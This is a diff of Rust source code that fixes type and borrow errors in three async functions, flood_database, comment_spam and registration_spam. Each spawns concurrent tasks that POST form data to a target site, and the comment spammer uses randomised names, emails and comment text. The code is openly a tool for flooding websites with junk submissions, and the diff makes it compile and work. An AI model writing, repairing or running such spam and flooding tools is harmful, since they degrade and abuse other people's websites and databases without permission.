@@ -45,7 +45,7 @@ pub async fn flood_database(
         tasks.push(tokio::spawn(async move {
             let _permit = permit;
             throttle(&lim).await;
-            let resp = c.post(&url).form(&form_data).send().await;
+            let resp: Result<reqwest::Response, reqwest::Error> = c.post(&url).form(&form_data).send().await;
             resp.is_ok() && resp.unwrap().status().is_success()
         }));
     }
@@ -165,18 +165,18 @@ pub async fn comment_spam(
         let url = target_url.to_string();
         let lim = rate_limiter.clone();
         let comment = comment_template.replace("__NUM__", &i.to_string());
-        let name = names.choose(&mut rand::thread_rng()).unwrap();
-        let email = emails.choose(&mut rand::thread_rng()).unwrap();
+        let name = *names.choose(&mut rand::thread_rng()).unwrap();
+        let email = *emails.choose(&mut rand::thread_rng()).unwrap();
 
         tasks.push(tokio::spawn(async move {
             let _permit = permit;
             throttle(&lim).await;
             let params = [
-                (comment_field, &comment),
+                (comment_field, comment.as_str()),
                 (name_field, name),
                 (email_field, email),
             ];
-            let resp = c.post(&url).form(&params).send().await;
+            let resp: Result<reqwest::Response, reqwest::Error> = c.post(&url).form(&params).send().await;
             resp.is_ok() && resp.unwrap().status().is_success()
         }));
     }
@@ -233,7 +233,7 @@ pub async fn registration_spam(
         tasks.push(tokio::spawn(async move {
             let _permit = permit;
             throttle(&lim).await;
-            let resp = c.post(&url).form(&form_data).send().await;
+            let resp: Result<reqwest::Response, reqwest::Error> = c.post(&url).form(&form_data).send().await;
             resp.is_ok() && resp.unwrap().status().is_success()
         }));
     }
